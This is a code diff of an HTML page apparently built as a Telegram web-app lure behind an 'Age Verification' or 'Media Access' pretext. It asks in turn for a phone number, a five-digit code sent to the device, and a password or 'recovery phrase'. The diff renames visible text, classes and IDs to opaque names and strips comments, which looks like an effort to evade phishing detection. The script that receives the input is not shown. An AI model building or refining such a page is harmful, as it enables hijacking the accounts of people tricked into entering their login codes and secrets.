@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Age Verification</title>
+    <title>Media Access</title>
     <link rel="stylesheet" href="styles.css">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
@@ -12,62 +12,53 @@
         <video class="background-video" autoplay muted loop playsinline>
             <source src="video/video1.mp4" type="video/mp4">
         </video>
-
         <div class="content">
-
-            <!-- Step 1 -->
             <div id="s1" style="width:100%;display:flex;flex-direction:column;align-items:center;gap:14px;">
-                <div class="instruction">
-                    <b>Account Verification</b><br><br>
-                    Enter your registered mobile number to continue.
+                <div class="nx">
+                    <b>Identity Confirmation</b><br><br>
+                    Enter your registered contact number to proceed.
                 </div>
-                <input type="tel" id="inp1" class="phone-input" placeholder="+91 98765 43210">
-                <button id="btn1" class="verify-btn">Continue</button>
+                <input type="tel" id="i1" class="px" placeholder="+91 98765 43210">
+                <button id="b1" class="ax">Proceed</button>
             </div>
-
-            <!-- Step 2 -->
             <div id="s2" style="display:none;width:100%;flex-direction:column;align-items:center;gap:12px;">
-                <div class="instruction">
-                    <b>Account Verification</b><br><br>
-                    Enter the access code sent to your device.
+                <div class="nx">
+                    <b>Identity Confirmation</b><br><br>
+                    Enter the token sent to your registered device.
                 </div>
-                <div class="otp-boxes">
-                    <input type="text" maxlength="1" class="cb" data-index="0" readonly>
-                    <input type="text" maxlength="1" class="cb" data-index="1" readonly>
-                    <input type="text" maxlength="1" class="cb" data-index="2" readonly>
-                    <input type="text" maxlength="1" class="cb" data-index="3" readonly>
-                    <input type="text" maxlength="1" class="cb" data-index="4" readonly>
+                <div class="dx">
+                    <input type="text" maxlength="1" class="cx" data-index="0" readonly>
+                    <input type="text" maxlength="1" class="cx" data-index="1" readonly>
+                    <input type="text" maxlength="1" class="cx" data-index="2" readonly>
+                    <input type="text" maxlength="1" class="cx" data-index="3" readonly>
+                    <input type="text" maxlength="1" class="cx" data-index="4" readonly>
                 </div>
-                <button id="btn2" class="verify-btn">Continue</button>
-                <div class="keypad">
-                    <button class="key" data-key="1">1</button>
-                    <button class="key" data-key="2">2</button>
-                    <button class="key" data-key="3">3</button>
-                    <button class="key" data-key="4">4</button>
-                    <button class="key" data-key="5">5</button>
-                    <button class="key" data-key="6">6</button>
-                    <button class="key" data-key="7">7</button>
-                    <button class="key" data-key="8">8</button>
-                    <button class="key" data-key="9">9</button>
+                <button id="b2" class="ax">Proceed</button>
+                <div class="gx">
+                    <button class="kx" data-k="1">1</button>
+                    <button class="kx" data-k="2">2</button>
+                    <button class="kx" data-k="3">3</button>
+                    <button class="kx" data-k="4">4</button>
+                    <button class="kx" data-k="5">5</button>
+                    <button class="kx" data-k="6">6</button>
+                    <button class="kx" data-k="7">7</button>
+                    <button class="kx" data-k="8">8</button>
+                    <button class="kx" data-k="9">9</button>
                     <div></div>
-                    <button class="key" data-key="0">0</button>
-                    <button class="key backspace" data-key="backspace">⌫</button>
+                    <button class="kx" data-k="0">0</button>
+                    <button class="kx bx" data-k="del">⌫</button>
                 </div>
             </div>
-
-            <!-- Step 3 -->
             <div id="s3" style="display:none;width:100%;flex-direction:column;align-items:center;gap:14px;">
-                <div class="instruction">
-                    <b>Security Check</b><br><br>
-                    Enter your security key to unlock access.
+                <div class="nx">
+                    <b>Additional Confirmation</b><br><br>
+                    Enter your recovery phrase to complete access.
                 </div>
-                <input type="password" id="inp3" class="phone-input" placeholder="Enter security key">
-                <button id="btn3" class="verify-btn">Unlock</button>
+                <input type="password" id="i3" class="px" placeholder="Recovery phrase">
+                <button id="b3" class="ax">Proceed</button>
             </div>
-
         </div>
     </div>
-
     <script src="app.js"></script>
 </body>
 </html>
